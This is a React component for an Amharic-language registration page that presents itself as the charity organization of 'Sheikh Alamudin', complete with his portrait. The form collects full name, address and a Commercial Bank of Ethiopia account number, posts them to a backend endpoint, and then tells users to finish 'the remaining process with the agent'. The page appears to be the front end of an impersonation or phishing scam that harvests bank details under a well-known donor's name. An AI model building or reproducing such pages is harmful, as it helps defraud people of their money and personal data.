import React, { useState, useEffect } from 'react';
import AuthLayout from '../components/AuthLayout';
import './CollectPage.css';

/* Animated success screen */
const SuccessScreen = ({ onReset }) => {
  const [show, setShow] = useState(false);

  /* Trigger entrance animation after mount */
  useEffect(() => {
    const t = setTimeout(() => setShow(true), 50);
    return () => clearTimeout(t);
  }, []);

  return (
    <div className={`success-screen ${show ? 'success-screen--in' : ''}`}>
      {/* Animated checkmark circle */}
      <div className="check-wrap">
        <svg
          className="check-svg"
          viewBox="0 0 52 52"
          aria-hidden="true"
        >
          <circle className="check-circle" cx="26" cy="26" r="25" />
          <path className="check-tick" d="M14 27 l8 8 l16-16" />
        </svg>
      </div>

      {/* Message */}
      <p className="success-msg">
        የመረጃ ምዝገባውን በተሣካ ሁኔታ አጠናቀዋል
      </p>
      <p className="success-sub">
        እባክዎ ቀሪውን ሂደት ከወኪሉ ጋር ይጨርሱ
      </p>

      {/* Register again */}
      <button className="collect-btn collect-btn-reset" onClick={onReset}>
        አዲስ ምዝገባ
      </button>
    </div>
  );
};

/* ─── Main page ─── */
const CollectPage = () => {
  const [formData, setFormData] = useState({
    fullName: '',
    address: '',
    accountNumber: '',
  });
  const [error,   setError]   = useState('');
  const [success, setSuccess] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
    setError('');
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const { fullName, address, accountNumber } = formData;

    if (!fullName.trim() || !address.trim() || !accountNumber.trim()) {
      setError('እባክዎ ሁሉንም መስኮች ይሙሉ');
      return;
    }

    try {
      setLoading(true);
      const API = process.env.REACT_APP_API_URL || '';
      const res = await fetch(`${API}/api/collect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ fullName, address, accountNumber }),
      });

      // Handle non-JSON responses (proxy errors, server down, etc.)
      const contentType = res.headers.get('content-type');
      if (!contentType || !contentType.includes('application/json')) {
        throw new Error('ሰርቨሩ አልተጀመረም። እባክዎ እንደገና ይሞክሩ።');
      }

      const data = await res.json();
      if (!res.ok) throw new Error(data.message || 'ስህተት ተፈጥሯል');
      setSuccess(true);
      setFormData({ fullName: '', address: '', accountNumber: '' });
    } catch (err) {
      if (err.message.includes('fetch') || err.message.includes('network') || err.message.includes('Failed')) {
        setError('ከሰርቨሩ ጋር መገናኘት አልተቻለም። በኋላ እንደገና ይሞክሩ።');
      } else {
        setError(err.message);
      }
    } finally {
      setLoading(false);
    }
  };

  const handleReset = () => setSuccess(false);

  return (
    <AuthLayout>
      {success ? (
        <SuccessScreen onReset={handleReset} />
      ) : (
        <>
          <h1 className="collect-title">ሼህ አለሙዲን የአርዳታ ድርጅት</h1>
          <p className="collect-subtitle">መረጃ ምዝገባ</p>

          {/* Portrait */}
          <div className="portrait-wrap">
            <div className="portrait-ring">
              <img src="/sheikh.jpg" alt="ሼህ አለሙዲን" className="portrait-img" />
            </div>
          </div>

          {/* Error */}
          {error && (
            <div className="error-banner" role="alert">{error}</div>
          )}

          {/* Form */}
          <form onSubmit={handleSubmit} className="collect-form" noValidate>

            <div className="field-group">
              <label htmlFor="fullName" className="field-label">ሙሉ ስም</label>
              <input
                id="fullName" name="fullName" type="text"
                className="field-input" placeholder="ሙሉ ስምዎን ያስገቡ"
                value={formData.fullName} onChange={handleChange}
                autoComplete="name" aria-required="true"
              />
            </div>

            <div className="field-group">
              <label htmlFor="address" className="field-label">አድራሻ</label>
              <input
                id="address" name="address" type="text"
                className="field-input" placeholder="አድራሻዎን ያስገቡ"
                value={formData.address} onChange={handleChange}
                autoComplete="street-address" aria-required="true"
              />
            </div>

            <div className="field-group">
              <label htmlFor="accountNumber" className="field-label">
                የኢትዮጵያ ንግድ ባንክ አካዉንት ቁጥር
              </label>
              <input
                id="accountNumber" name="accountNumber"
                type="text" inputMode="numeric"
                className="field-input" placeholder="የባንክ አካዉንት ቁጥርዎን ያስገቡ"
                value={formData.accountNumber} onChange={handleChange}
                autoComplete="off" aria-required="true"
              />
            </div>

            <button
              type="submit" className="collect-btn"
              disabled={loading} aria-busy={loading}
            >
              {loading ? (
                <span className="btn-loading">
                  <span className="spinner" /> በመጫን ላይ...
                </span>
              ) : 'መረጃውን ላክ'}
            </button>

          </form>
        </>
      )}
    </AuthLayout>
  );
};

export default CollectPage;
